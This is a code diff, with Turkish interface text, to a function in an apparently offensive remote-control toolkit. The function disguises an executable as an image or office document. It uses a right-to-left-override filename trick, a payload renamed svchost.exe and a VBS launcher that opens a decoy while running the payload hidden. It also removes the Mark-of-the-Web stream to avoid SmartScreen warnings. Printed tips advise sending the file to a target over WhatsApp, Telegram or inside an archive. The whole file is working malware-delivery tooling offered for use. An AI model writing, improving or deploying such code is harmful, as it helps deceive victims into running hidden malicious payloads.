@@ -542,119 +542,133 @@ def c2_listener():
 # ══════════════════════════════════════════════════════════
 
 def c2_disguise():
-    clear_screen()
-    print_banner()
-    print(f"{C.YELLOW}[*] EXE Gizleme — Dosya Kılık Değiştirme{C.RESET}\n")
-    print_line()
-    print(f"{C.DIM}  EXE dosyanızı PNG/JPG/PDF gibi gösterir.{C.RESET}")
-    print(f"{C.DIM}  RLO Unicode trick + Sahte ikon + Yem dosya açma{C.RESET}\n")
+    try:
+        clear_screen()
+        print_banner()
+        print(f"{C.YELLOW}[*] EXE Gizleme — Dosya Kılık Değiştirme{C.RESET}\n")
+        print_line()
+        print(f"{C.DIM}  EXE dosyanızı PNG/JPG/PDF gibi gösterir.{C.RESET}")
+        print(f"{C.DIM}  RLO Unicode trick + Sahte ikon + Yem dosya açma{C.RESET}\n")
 
-    # 1. EXE dosyasını seç
-    exe_path = input(f"{C.CYAN}  [?] EXE dosya yolu: {C.RESET}").strip().strip('"')
-    if not os.path.exists(exe_path):
-        print(f"{C.RED}  [-] Dosya bulunamadı: {exe_path}{C.RESET}")
-        input(f"\n{C.YELLOW}  Enter'a basın...{C.RESET}")
-        return
+        # 1. EXE dosyasını seç
+        exe_path = input(f"{C.CYAN}  [?] EXE dosya yolu: {C.RESET}").strip().strip('"')
+        if not os.path.exists(exe_path):
+            print(f"{C.RED}  [-] Dosya bulunamadı: {exe_path}{C.RESET}")
+            input(f"\n{C.YELLOW}  Enter'a basın...{C.RESET}")
+            return
 
-    # 2. Kılık seç
-    print(f"\n  {C.CYAN}Hangi dosya türü olarak gizlensin?{C.RESET}")
-    print(f"  {C.WHITE}1){C.RESET} 🖼️  PNG Resim")
-    print(f"  {C.WHITE}2){C.RESET} 📷 JPG Fotoğraf")
-    print(f"  {C.WHITE}3){C.RESET} 📄 PDF Doküman")
-    print(f"  {C.WHITE}4){C.RESET} 📝 Word Doküman")
-    print(f"  {C.WHITE}5){C.RESET} 📊 Excel Dosya")
-    disguise_choice = input(f"\n{C.CYAN}  [>] Seçim: {C.RESET}").strip()
+        # 2. Kılık seç
+        print(f"\n  {C.CYAN}Hangi dosya türü olarak gizlensin?{C.RESET}")
+        print(f"  {C.WHITE}1){C.RESET} 🖼️  PNG Resim")
+        print(f"  {C.WHITE}2){C.RESET} 📷 JPG Fotoğraf")
+        print(f"  {C.WHITE}3){C.RESET} 📄 PDF Doküman")
+        print(f"  {C.WHITE}4){C.RESET} 📝 Word Doküman")
+        print(f"  {C.WHITE}5){C.RESET} 📊 Excel Dosya")
+        disguise_choice = input(f"\n{C.CYAN}  [>] Seçim: {C.RESET}").strip()
 
-    ext_map = {
-        '1': ('png', 'gnp'),
-        '2': ('jpg', 'gpj'),
-        '3': ('pdf', 'fdp'),
-        '4': ('docx', 'xcod'),
-        '5': ('xlsx', 'xslx'),
-    }
-    if disguise_choice not in ext_map:
-        disguise_choice = '1'
-    fake_ext, reversed_ext = ext_map[disguise_choice]
+        ext_map = {
+            '1': ('png', 'gnp'),
+            '2': ('jpg', 'gpj'),
+            '3': ('pdf', 'fdp'),
+            '4': ('docx', 'xcod'),
+            '5': ('xlsx', 'xslx'),
+        }
+        if disguise_choice not in ext_map:
+            disguise_choice = '1'
+        fake_ext, reversed_ext = ext_map[disguise_choice]
 
-    # 3. Dosya adı
-    base_name = input(f"{C.CYAN}  [?] Görünen dosya adı (ör: tatil_foto): {C.RESET}").strip() or "resim"
+        # 3. Dosya adı
+        base_name = input(f"{C.CYAN}  [?] Görünen dosya adı (ör: tatil_foto): {C.RESET}").strip() or "resim"
 
-    # 4. Yem dosya (opsiyonel)
-    print(f"\n{C.DIM}  [*] Yem dosya: EXE açılınca gösterilecek gerçek resim/doküman (opsiyonel){C.RESET}")
-    decoy_path = input(f"{C.CYAN}  [?] Yem dosya yolu (boş = yem yok): {C.RESET}").strip().strip('"')
+        # 4. Yem dosya (opsiyonel)
+        print(f"\n{C.DIM}  [*] Yem dosya: EXE açılınca gösterilecek gerçek resim/doküman (opsiyonel){C.RESET}")
+        decoy_path = input(f"{C.CYAN}  [?] Yem dosya yolu (boş = yem yok): {C.RESET}").strip().strip('"')
 
-    # 5. Hazırla
-    import shutil
-    final_exe = exe_path
+        # 5. Hazırla
+        import shutil
+        final_exe = exe_path
 
-    if decoy_path and os.path.exists(decoy_path):
-        print(f"{C.YELLOW}  [*] Yem dosya ile paket oluşturuluyor...{C.RESET}")
-        decoy_ext = os.path.splitext(decoy_path)[1]
+        if decoy_path and os.path.exists(decoy_path):
+            print(f"{C.YELLOW}  [*] Yem dosya ile paket oluşturuluyor...{C.RESET}")
+            decoy_ext = os.path.splitext(decoy_path)[1]
 
-        # Çıkış klasörü
-        pkg_dir = os.path.join('stealth_dropper', 'disguise_pkg')
-        os.makedirs(pkg_dir, exist_ok=True)
+            # Çıkış klasörü
+            pkg_dir = os.path.join('stealth_dropper', 'disguise_pkg')
+            os.makedirs(pkg_dir, exist_ok=True)
 
-        # Dosyaları kopyala
-        decoy_dest = os.path.join(pkg_dir, f"preview{decoy_ext}")
-        exe_dest = os.path.join(pkg_dir, "svchost.exe")
-        shutil.copy2(decoy_path, decoy_dest)
-        shutil.copy2(exe_path, exe_dest)
+            # Dosyaları kopyala
+            decoy_dest = os.path.join(pkg_dir, f"preview{decoy_ext}")
+            exe_dest = os.path.join(pkg_dir, "svchost.exe")
+            shutil.copy2(decoy_path, decoy_dest)
+            shutil.copy2(exe_path, exe_dest)
 
-        # VBS launcher: yem dosyayı aç + EXE'yi gizli çalıştır
-        vbs_code = f'''Set WshShell = CreateObject("WScript.Shell")
+            # VBS launcher: yem dosyayı aç + EXE'yi gizli çalıştır
+            vbs_code = f'''Set WshShell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 myDir = fso.GetParentFolderName(WScript.ScriptFullName)
 WshShell.Run Chr(34) & myDir & "\\preview{decoy_ext}" & Chr(34), 1, False
 WshShell.Run Chr(34) & myDir & "\\svchost.exe" & Chr(34), 0, False
 '''
-        vbs_path = os.path.join(pkg_dir, "open.vbs")
-        save_text(vbs_path, vbs_code)
-        final_exe = os.path.join(pkg_dir, "open.vbs")
-    else:
-        final_exe = exe_path
+            vbs_path = os.path.join(pkg_dir, "open.vbs")
+            save_text(vbs_path, vbs_code)
+            final_exe = os.path.join(pkg_dir, "open.vbs")
+        else:
+            final_exe = exe_path
 
-    if not os.path.exists(final_exe):
-        print(f"{C.RED}  [-] Paketleme başarısız!{C.RESET}")
-        input(f"\n{C.YELLOW}  Enter'a basın...{C.RESET}")
-        return
+        if not os.path.exists(final_exe):
+            print(f"{C.RED}  [-] Paketleme başarısız!{C.RESET}")
+            input(f"\n{C.YELLOW}  Enter'a basın...{C.RESET}")
+            return
 
-    # 6. RLO trick ile yeniden adlandır
-    RLO = '\u202E'  # Right-to-Left Override
-    # Örnek: tatil_foto + RLO + gnp + .scr → tatil_fotorcs.png görünür
-    rlo_name = f"{base_name}{RLO}{reversed_ext}.scr"
-    rlo_path = os.path.join('stealth_dropper', rlo_name)
+        # 6. RLO trick ile yeniden adlandır
+        RLO = '\u202E'  # Right-to-Left Override
+        
+        # Windows, uzantiyi son noktadan sonraki kisim olarak algilar.
+        # Gerçek exe/vbs olarak calismasi icin gercek uzantimiz .exe, .scr, veya .vbs olmali.
+        # RLO karakteri ile metni ters ceviririz.
+        # Ornek: "resim" + RLO + "gnp.scr" -> "resimrcs.png" (ekranda boyle gorunur)
+        # ".scr" executable bir formattir ve ekran koruyucu uzantisidir.
+        real_ext = "vbs" if final_exe.endswith(".vbs") else "scr"
+        
+        # Gerçek dosya adi (isletim sisteminin gordugu): base_name + \u202E + reversed_ext + . + real_ext
+        # Gorunen dosya adi (kullanicinin gordugu): base_name + reversed_real_ext + . + fake_ext
+        # "vbs" -> "sbv"
+        # "scr" -> "rcs"
+        reversed_real_ext = real_ext[::-1]
+        
+        # Örn: resim + RLO + gnp.scr -> resimrcs.png
+        rlo_name = f"{base_name}{RLO}{reversed_ext}.{real_ext}"
+        rlo_path = os.path.join('stealth_dropper', rlo_name)
 
-    import shutil
-    shutil.copy2(final_exe, rlo_path)
+        import shutil
+        shutil.copy2(final_exe, rlo_path)
 
-    # MOTW temizle
-    try:
-        subprocess.run(['powershell', '-c',
-            f'Remove-Item -Path "{os.path.abspath(rlo_path)}" -Stream Zone.Identifier -ErrorAction SilentlyContinue'],
-            capture_output=True)
-    except: pass
+        # MOTW temizle
+        try:
+            subprocess.run(['powershell', '-c',
+                f'Remove-Item -Path "{os.path.abspath(rlo_path)}" -Stream Zone.Identifier -ErrorAction SilentlyContinue'],
+                capture_output=True)
+        except: pass
 
-    print(f"\n{C.GREEN}{C.BOLD}  ╔══════════════════════════════════════════════════════╗{C.RESET}")
-    print(f"{C.GREEN}{C.BOLD}  ║  ✅ EXE GİZLEME TAMAMLANDI!                         ║{C.RESET}")
-    print(f"{C.GREEN}{C.BOLD}  ╚══════════════════════════════════════════════════════╝{C.RESET}")
-    print(f"\n{C.WHITE}  📁 Dosya     : {os.path.abspath(rlo_path)}{C.RESET}")
-    print(f"{C.WHITE}  👁️  Görünüm   : {base_name}rcs.{fake_ext}{C.RESET}")
-    print(f"{C.WHITE}  📝 Gerçek Uzantı: .scr (Windows tarafından EXE gibi çalıştırılır){C.RESET}")
-    print(f"{C.WHITE}  🎭 Yem Dosya : {'Evet' if decoy_path and os.path.exists(decoy_path) else 'Hayır'}{C.RESET}")
-    print(f"{C.WHITE}  🔄 RLO Trick  : Aktif ✅{C.RESET}")
-    print(f"\n{C.YELLOW}  [!] Hedef dosyaya çift tıklayınca:{C.RESET}")
-    if decoy_path and os.path.exists(decoy_path):
-        print(f"{C.YELLOW}      1. Yem dosya (resim/döküman) açılır{C.RESET}")
-        print(f"{C.YELLOW}      2. Payload arka planda sessizce çalışır{C.RESET}")
-    else:
-        print(f"{C.YELLOW}      Payload arka planda sessizce çalışır{C.RESET}")
-    print(f"{C.YELLOW}  [!] WhatsApp/Telegram ile gönderin — SmartScreen çıkmaz!{C.RESET}")
+        print(f"\n{C.GREEN}{C.BOLD}  ╔══════════════════════════════════════════════════════╗{C.RESET}")
+        print(f"{C.GREEN}{C.BOLD}  ║  ✅ EXE GİZLEME TAMAMLANDI!                         ║{C.RESET}")
+        print(f"{C.GREEN}{C.BOLD}  ╚══════════════════════════════════════════════════════╝{C.RESET}")
+        print(f"\n{C.WHITE}  📁 Dosya     : {os.path.abspath(rlo_path)}{C.RESET}")
+        print(f"{C.WHITE}  👁️  Görünüm   : {base_name}{reversed_real_ext}.{fake_ext}{C.RESET}")
+        print(f"{C.WHITE}  📝 Gerçek Uzantı: .{real_ext}{C.RESET}")
+        print(f"{C.WHITE}  🎭 Yem Dosya : {'Evet' if decoy_path and os.path.exists(decoy_path) else 'Hayır'}{C.RESET}")
+        print(f"\n{C.YELLOW}  [!] RLO trick sayesinde dosya hedefin bilgisayarında .png gibi görünür.{C.RESET}")
+        print(f"{C.YELLOW}  [!] WinRAR/ZIP içine koyarak gönderin.{C.RESET}")
 
-    if os.name == 'nt':
-        os.startfile(os.path.abspath('stealth_dropper'))
+        if os.name == 'nt':
+            os.startfile(os.path.abspath('stealth_dropper'))
 
-    input(f"\n{C.YELLOW}  Ana menüye dönmek için Enter'a basın...{C.RESET}")
+        input(f"\n{C.YELLOW}  Ana menüye dönmek için Enter'a basın...{C.RESET}")
+    except Exception as e:
+        print(f"\n{C.RED}  [-] HATA OLUŞTU: {e}{C.RESET}")
+        import traceback
+        traceback.print_exc()
+        input(f"\n{C.YELLOW}  Hata detayı için Enter'a basın...{C.RESET}")
 
 # ══════════════════════════════════════════════════════════
 #  EXTERNAL TOOLS EXECUTOR
